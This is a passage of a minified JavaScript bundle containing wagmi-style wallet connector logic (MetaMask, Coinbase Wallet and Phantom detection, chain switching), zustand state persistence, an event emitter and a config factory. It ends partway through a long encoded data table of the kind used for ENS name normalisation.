this.getChainId()===l&&c.emitter.emit("change",{chainId:l})}),g]),d}catch(_){const T=_;if(T.code===4902||((m=(y=T==null?void 0:T.data)==null?void 0:y.originalError)==null?void 0:m.code)===4902)try{const{default:P,...S}=d.blockExplorers??{};let C;u!=null&&u.blockExplorerUrls?C=u.blockExplorerUrls:P&&(C=[P.url,...Object.values(S).map(D=>D.url)]);let O;(b=u==null?void 0:u.rpcUrls)!=null&&b.length?O=u.rpcUrls:O=[((A=d.rpcUrls.default)==null?void 0:A.http[0])??""];const $={blockExplorerUrls:C,chainId:Ue(l),chainName:(u==null?void 0:u.chainName)??d.name,iconUrls:u==null?void 0:u.iconUrls,nativeCurrency:(u==null?void 0:u.nativeCurrency)??d.nativeCurrency,rpcUrls:O};return await Promise.all([h.request({method:"wallet_addEthereumChain",params:[$]}).then(async()=>{if(await this.getChainId()===l)c.emitter.emit("change",{chainId:l});else throw new hr(new Error("User rejected switch after adding network."))}),g]),d}catch(P){throw new hr(P)}throw T.code===hr.code?new hr(T):new zi(T)}},async onAccountsChanged(u){var l;if(u.length===0)this.onDisconnect();else if(c.emitter.listenerCount("connect")){const h=(await this.getChainId()).toString();this.onConnect({chainId:h}),e&&await((l=c.storage)==null?void 0:l.removeItem(`${this.id}.disconnected`))}else c.emitter.emit("change",{accounts:u.map(h=>Lo(h))})},onChainChanged(u){const l=Number(u);c.emitter.emit("change",{chainId:l})},async onConnect(u){const l=await this.getAccounts();if(l.length===0)return;const h=Number(u.chainId);c.emitter.emit("connect",{accounts:l,chainId:h});const d=await this.getProvider();d&&(o&&(d.removeListener("connect",o),o=void 0),i||(i=this.onAccountsChanged.bind(this),d.on("accountsChanged",i)),s||(s=this.onChainChanged.bind(this),d.on("chainChanged",s)),a||(a=this.onDisconnect.bind(this),d.on("disconnect",a)))},async onDisconnect(u){const l=await this.getProvider();u&&u.code===1013&&l&&(await this.getAccounts()).length||(c.emitter.emit("disconnect"),l&&(s&&(l.removeListener("chainChanged",s),s=void 0),a&&(l.removeListener("disconnect",a),a=void 0),o||(o=this.onConnect.bind(this),l.on("connect",o))))}})}const jW={coinbaseWallet:{id:"coinbaseWallet",name:"Coinbase Wallet",provider(t){return t!=null&&t.coinbaseWalletExtension?t.coinbaseWalletExtension:md(t,"isCoinbaseWallet")}},metaMask:{id:"metaMask",name:"MetaMask",provider(t){return md(t,e=>{if(!e.isMetaMask||e.isBraveWallet&&!e._events&&!e._state)return!1;const r=["isApexWallet","isAvalanche","isBitKeep","isBlockWallet","isKuCoinWallet","isMathWallet","isOkxWallet","isOKExWallet","isOneInchIOSWallet","isOneInchAndroidWallet","isOpera","isPhantom","isPortal","isRabby","isTokenPocket","isTokenary","isUniswapWallet","isZerion"];for(const n of r)if(e[n])return!1;return!0})}},phantom:{id:"phantom",name:"Phantom",provider(t){var e,r;return(e=t==null?void 0:t.phantom)!=null&&e.ethereum?(r=t.phantom)==null?void 0:r.ethereum:md(t,"isPhantom")}}};function md(t,e){function r(i){return typeof e=="function"?e(i):typeof e=="string"?i[e]:!0}const n=t.ethereum;if(n!=null&&n.providers)return n.providers.find(i=>r(i));if(n&&r(n))return n}function qW(t){if(typeof window>"u")return;const e=r=>t(r.detail);return window.addEventListener("eip6963:announceProvider",e),window.dispatchEvent(new CustomEvent("eip6963:requestProvider")),()=>window.removeEventListener("eip6963:announceProvider",e)}function zW(){const t=new Set;let e=[];const r=()=>qW(i=>{e.some(({info:s})=>s.uuid===i.info.uuid)||(e=[...e,i],t.forEach(s=>s(e,{added:[i]})))});let n=r();return{_listeners(){return t},clear(){t.forEach(i=>i([],{removed:[...e]})),e=[]},destroy(){this.clear(),t.clear(),n==null||n()},findProvider({rdns:i}){return e.find(s=>s.info.rdns===i)},getProviders(){return e},reset(){this.clear(),n==null||n(),n=r()},subscribe(i,{emitImmediately:s}={}){return t.add(i),s&&i(e,{added:e}),()=>t.delete(i)}}}const HW=t=>(e,r,n)=>{const i=n.subscribe;return n.subscribe=(o,a,c)=>{let u=o;if(a){const l=(c==null?void 0:c.equalityFn)||Object.is;let h=o(n.getState());u=d=>{const g=o(d);if(!l(h,g)){const y=h;a(h=g,y)}},c!=null&&c.fireImmediately&&a(h,h)}return i(u)},t(e,r,n)},WW=HW;function GW(t,e){let r;try{r=t()}catch{return}return{getItem:i=>{var s;const o=c=>c===null?null:JSON.parse(c,void 0),a=(s=r.getItem(i))!=null?s:null;return a instanceof Promise?a.then(o):o(a)},setItem:(i,s)=>r.setItem(i,JSON.stringify(s,void 0)),removeItem:i=>r.removeItem(i)}}const N0=t=>e=>{try{const r=t(e);return r instanceof Promise?r:{then(n){return N0(n)(r)},catch(n){return this}}}catch(r){return{then(n){return this},catch(n){return N0(n)(r)}}}},VW=(t,e)=>(r,n,i)=>{let s={storage:GW(()=>localStorage),partialize:m=>m,version:0,merge:(m,b)=>({...b,...m}),...e},o=!1;const a=new Set,c=new Set;let u=s.storage;if(!u)return t((...m)=>{console.warn(`[zustand persist middleware] Unable to update item '${s.name}', the given storage is currently unavailable.`),r(...m)},n,i);const l=()=>{const m=s.partialize({...n()});return u.setItem(s.name,{state:m,version:s.version})},h=i.setState;i.setState=(m,b)=>{h(m,b),l()};const d=t((...m)=>{r(...m),l()},n,i);i.getInitialState=()=>d;let g;const y=()=>{var m,b;if(!u)return;o=!1,a.forEach(_=>{var T;return _((T=n())!=null?T:d)});const A=((b=s.onRehydrateStorage)==null?void 0:b.call(s,(m=n())!=null?m:d))||void 0;return N0(u.getItem.bind(u))(s.name).then(_=>{if(_)if(typeof _.version=="number"&&_.version!==s.version){if(s.migrate)return[!0,s.migrate(_.state,_.version)];console.error("State loaded from storage couldn't be migrated since no migrate function was provided")}else return[!1,_.state];return[!1,void 0]}).then(_=>{var T;const[P,S]=_;if(g=s.merge(S,(T=n())!=null?T:d),r(g,!0),P)return l()}).then(()=>{A==null||A(g,void 0),g=n(),o=!0,c.forEach(_=>_(g))}).catch(_=>{A==null||A(void 0,_)})};return i.persist={setOptions:m=>{s={...s,...m},m.storage&&(u=m.storage)},clearStorage:()=>{u==null||u.removeItem(s.name)},getOptions:()=>s,rehydrate:()=>y(),hasHydrated:()=>o,onHydrate:m=>(a.add(m),()=>{a.delete(m)}),onFinishHydration:m=>(c.add(m),()=>{c.delete(m)})},s.skipHydration||y(),g||d},KW=VW,aA=t=>{let e;const r=new Set,n=(u,l)=>{const h=typeof u=="function"?u(e):u;if(!Object.is(h,e)){const d=e;e=l??(typeof h!="object"||h===null)?h:Object.assign({},e,h),r.forEach(g=>g(e,d))}},i=()=>e,a={setState:n,getState:i,getInitialState:()=>c,subscribe:u=>(r.add(u),()=>r.delete(u))},c=e=t(n,i,a);return a},$g=t=>t?aA(t):aA;var Lg={exports:{}},cA;function QW(){return cA||(cA=1,function(t){var e=Object.prototype.hasOwnProperty,r="~";function n(){}Object.create&&(n.prototype=Object.create(null),new n().__proto__||(r=!1));function i(c,u,l){this.fn=c,this.context=u,this.once=l||!1}function s(c,u,l,h,d){if(typeof l!="function")throw new TypeError("The listener must be a function");var g=new i(l,h||c,d),y=r?r+u:u;return c._events[y]?c._events[y].fn?c._events[y]=[c._events[y],g]:c._events[y].push(g):(c._events[y]=g,c._eventsCount++),c}function o(c,u){--c._eventsCount===0?c._events=new n:delete c._events[u]}function a(){this._events=new n,this._eventsCount=0}a.prototype.eventNames=function(){var u=[],l,h;if(this._eventsCount===0)return u;for(h in l=this._events)e.call(l,h)&&u.push(r?h.slice(1):h);return Object.getOwnPropertySymbols?u.concat(Object.getOwnPropertySymbols(l)):u},a.prototype.listeners=function(u){var l=r?r+u:u,h=this._events[l];if(!h)return[];if(h.fn)return[h.fn];for(var d=0,g=h.length,y=new Array(g);d<g;d++)y[d]=h[d].fn;return y},a.prototype.listenerCount=function(u){var l=r?r+u:u,h=this._events[l];return h?h.fn?1:h.length:0},a.prototype.emit=function(u,l,h,d,g,y){var m=r?r+u:u;if(!this._events[m])return!1;var b=this._events[m],A=arguments.length,_,T;if(b.fn){switch(b.once&&this.removeListener(u,b.fn,void 0,!0),A){case 1:return b.fn.call(b.context),!0;case 2:return b.fn.call(b.context,l),!0;case 3:return b.fn.call(b.context,l,h),!0;case 4:return b.fn.call(b.context,l,h,d),!0;case 5:return b.fn.call(b.context,l,h,d,g),!0;case 6:return b.fn.call(b.context,l,h,d,g,y),!0}for(T=1,_=new Array(A-1);T<A;T++)_[T-1]=arguments[T];b.fn.apply(b.context,_)}else{var P=b.length,S;for(T=0;T<P;T++)switch(b[T].once&&this.removeListener(u,b[T].fn,void 0,!0),A){case 1:b[T].fn.call(b[T].context);break;case 2:b[T].fn.call(b[T].context,l);break;case 3:b[T].fn.call(b[T].context,l,h);break;case 4:b[T].fn.call(b[T].context,l,h,d);break;default:if(!_)for(S=1,_=new Array(A-1);S<A;S++)_[S-1]=arguments[S];b[T].fn.apply(b[T].context,_)}}return!0},a.prototype.on=function(u,l,h){return s(this,u,l,h,!1)},a.prototype.once=function(u,l,h){return s(this,u,l,h,!0)},a.prototype.removeListener=function(u,l,h,d){var g=r?r+u:u;if(!this._events[g])return this;if(!l)return o(this,g),this;var y=this._events[g];if(y.fn)y.fn===l&&(!d||y.once)&&(!h||y.context===h)&&o(this,g);else{for(var m=0,b=[],A=y.length;m<A;m++)(y[m].fn!==l||d&&!y[m].once||h&&y[m].context!==h)&&b.push(y[m]);b.length?this._events[g]=b.length===1?b[0]:b:o(this,g)}return this},a.prototype.removeAllListeners=function(u){var l;return u?(l=r?r+u:u,this._events[l]&&o(this,l)):(this._events=new n,this._eventsCount=0),this},a.prototype.off=a.prototype.removeListener,a.prototype.addListener=a.prototype.on,a.prefixed=r,a.EventEmitter=a,t.exports=a}(Lg)),Lg.exports}var YW=QW();const JW=co(YW);class ZW{constructor(e){Object.defineProperty(this,"uid",{enumerable:!0,configurable:!0,writable:!0,value:e}),Object.defineProperty(this,"_emitter",{enumerable:!0,configurable:!0,writable:!0,value:new JW})}on(e,r){this._emitter.on(e,r)}once(e,r){this._emitter.once(e,r)}off(e,r){this._emitter.off(e,r)}emit(e,...r){const n=r[0];this._emitter.emit(e,{uid:this.uid,...n})}listenerCount(e){return this._emitter.listenerCount(e)}}function XW(t){return new ZW(t)}function eG(t,e){return JSON.parse(t,(r,n)=>{let i=n;return(i==null?void 0:i.__type)==="bigint"&&(i=BigInt(i.value)),(i==null?void 0:i.__type)==="Map"&&(i=new Map(i.value)),(e==null?void 0:e(r,i))??i})}function uA(t,e){return t.slice(0,e).join(".")||"."}function lA(t,e){const{length:r}=t;for(let n=0;n<r;++n)if(t[n]===e)return n+1;return 0}function tG(t,e){const r=typeof t=="function",n=typeof e=="function",i=[],s=[];return function(a,c){if(typeof c=="object")if(i.length){const u=lA(i,this);u===0?i[i.length]=this:(i.splice(u),s.splice(u)),s[s.length]=a;const l=lA(i,c);if(l!==0)return n?e.call(this,a,c,uA(s,l)):`[ref=${uA(s,l)}]`}else i[0]=c,s[0]=a;return r?t.call(this,a,c):c}}function rG(t,e,r,n){return JSON.stringify(t,tG((i,s)=>{let o=s;return typeof o=="bigint"&&(o={__type:"bigint",value:s.toString()}),o instanceof Map&&(o={__type:"Map",value:Array.from(s.entries())}),(e==null?void 0:e(i,o))??o},n),r??void 0)}function nG(t){const{deserialize:e=eG,key:r="wagmi",serialize:n=rG,storage:i=W2}=t;function s(o){return o instanceof Promise?o.then(a=>a).catch(()=>null):o}return{...i,key:r,async getItem(o,a){const c=i.getItem(`${r}.${o}`),u=await s(c);return u?e(u)??null:a??null},async setItem(o,a){const c=`${r}.${o}`;a===null?await s(i.removeItem(c)):await s(i.setItem(c,n(a)))},async removeItem(o){await s(i.removeItem(`${r}.${o}`))}}}const W2={getItem:()=>null,setItem:()=>{},removeItem:()=>{}};function iG(){const t=typeof window<"u"&&window.localStorage?window.localStorage:W2;return{getItem(e){return t.getItem(e)},removeItem(e){t.removeItem(e)},setItem(e,r){try{t.setItem(e,r)}catch{}}}}const T0=256;let Qh=T0,Yh;function sG(t=11){if(!Yh||Qh+t>T0*2){Yh="",Qh=0;for(let e=0;e<T0;e++)Yh+=(256+Math.random()*256|0).toString(16).substring(1)}return Yh.substring(Qh,Qh+++t)}function oG(t){const{multiInjectedProviderDiscovery:e=!0,storage:r=nG({storage:iG()}),syncConnectedChain:n=!0,ssr:i=!1,...s}=t,o=typeof window<"u"&&e?zW():void 0,a=$g(()=>s.chains),c=$g(()=>{const S=[],C=new Set;for(const O of s.connectors??[]){const $=u(O);if(S.push($),!i&&$.rdns){const D=typeof $.rdns=="string"?[$.rdns]:$.rdns;for(const F of D)C.add(F)}}if(!i&&o){const O=o.getProviders();for(const $ of O)C.has($.info.rdns)||S.push(u(l($)))}return S});function u(S){var $;const C=XW(sG()),O={...S({emitter:C,chains:a.getState(),storage:r,transports:s.transports}),emitter:C,uid:C.uid};return C.on("connect",T),($=O.setup)==null||$.call(O),O}function l(S){const{info:C}=S,O=S.provider;return Zf({target:{...C,id:C.rdns,provider:O}})}const h=new Map;function d(S={}){const C=S.chainId??b.getState().chainId,O=a.getState().find(D=>D.id===C);if(S.chainId&&!O)throw new kl;{const D=h.get(b.getState().chainId);if(D&&!O)return D;if(!O)throw new kl}{const D=h.get(C);if(D)return D}let $;if(s.client)$=s.client({chain:O});else{const D=O.id,F=a.getState().map(N=>N.id),j={},L=Object.entries(s);for(const[N,f]of L)if(!(N==="chains"||N==="client"||N==="connectors"||N==="transports"))if(typeof f=="object")if(D in f)j[N]=f[D];else{if(F.some(w=>w in f))continue;j[N]=f}else j[N]=f;$=m2({...j,chain:O,batch:j.batch??{multicall:!0},transport:N=>s.transports[D]({...N,connectors:c})})}return h.set(C,$),$}function g(){return{chainId:a.getState()[0].id,connections:new Map,current:null,status:"disconnected"}}let y;const m="0.0.0-canary-";gd.startsWith(m)?y=Number.parseInt(gd.replace(m,"")):y=Number.parseInt(gd.split(".")[0]??"0");const b=$g(WW(r?KW(g,{migrate(S,C){if(C===y)return S;const O=g(),$=A(S,O.chainId);return{...O,chainId:$}},name:"store",partialize(S){return{connections:{__type:"Map",value:Array.from(S.connections.entries()).map(([C,O])=>{const{id:$,name:D,type:F,uid:j}=O.connector;return[C,{...O,connector:{id:$,name:D,type:F,uid:j}}]})},chainId:S.chainId,current:S.current}},merge(S,C){typeof S=="object"&&S&&"status"in S&&delete S.status;const O=A(S,C.chainId);return{...C,...S,chainId:O}},skipHydration:i,storage:r,version:y}):g));b.setState(g());function A(S,C){return S&&typeof S=="object"&&"chainId"in S&&typeof S.chainId=="number"&&a.getState().some(O=>O.id===S.chainId)?S.chainId:C}n&&b.subscribe(({connections:S,current:C})=>{var O;return C?(O=S.get(C))==null?void 0:O.chainId:void 0},S=>{if(a.getState().some(O=>O.id===S))return b.setState(O=>({...O,chainId:S??O.chainId}))}),o==null||o.subscribe(S=>{const C=new Set,O=new Set;for(const D of c.getState())if(C.add(D.id),D.rdns){const F=typeof D.rdns=="string"?[D.rdns]:D.rdns;for(const j of F)O.add(j)}const $=[];for(const D of S){if(O.has(D.info.rdns))continue;const F=u(l(D));C.has(F.id)||$.push(F)}r&&!b.persist.hasHydrated()||c.setState(D=>[...D,...$],!0)});function _(S){b.setState(C=>{const O=C.connections.get(S.uid);return O?{...C,connections:new Map(C.connections).set(S.uid,{accounts:S.accounts??O.accounts,chainId:S.chainId??O.chainId,connector:O.connector})}:C})}function T(S){b.getState().status==="connecting"||b.getState().status==="reconnecting"||b.setState(C=>{const O=c.getState().find($=>$.uid===S.uid);return O?(O.emitter.listenerCount("connect")&&O.emitter.off("connect",_),O.emitter.listenerCount("change")||O.emitter.on("change",_),O.emitter.listenerCount("disconnect")||O.emitter.on("disconnect",P),{...C,connections:new Map(C.connections).set(S.uid,{accounts:S.accounts,chainId:S.chainId,connector:O}),current:S.uid,status:"connected"}):C})}function P(S){b.setState(C=>{const O=C.connections.get(S.uid);if(O){const D=O.connector;D.emitter.listenerCount("change")&&O.connector.emitter.off("change",_),D.emitter.listenerCount("disconnect")&&O.connector.emitter.off("disconnect",P),D.emitter.listenerCount("connect")||O.connector.emitter.on("connect",T)}if(C.connections.delete(S.uid),C.connections.size===0)return{...C,connections:new Map,current:null,status:"disconnected"};const $=C.connections.values().next().value;return{...C,connections:new Map(C.connections),current:$.connector.uid}})}return{get chains(){return a.getState()},get connectors(){return c.getState()},storage:r,getClient:d,get state(){return b.getState()},setState(S){let C;typeof S=="function"?C=S(b.getState()):C=S;const O=g();typeof C!="object"&&(C=O),Object.keys(O).some(D=>!(D in C))&&(C=O),b.setState(C,!0)},subscribe(S,C,O){return b.subscribe(S,C,O?{...O,fireImmediately:O.emitImmediately}:void 0)},_internal:{mipd:o,store:b,ssr:!!i,syncConnectedChain:n,transports:s.transports,chains:{setState(S){const C=typeof S=="function"?S(a.getState()):S;if(C.length!==0)return a.setState(C,!0)},subscribe(S){return a.subscribe(S)}},connectors:{providerDetailToConnector:l,setup:u,setState(S){return c.setState(typeof S=="function"?S(c.getState()):S,!0)},subscribe(S){return c.subscribe(S)}},events:{change:_,connect:T,disconnect:P}}}}var aG="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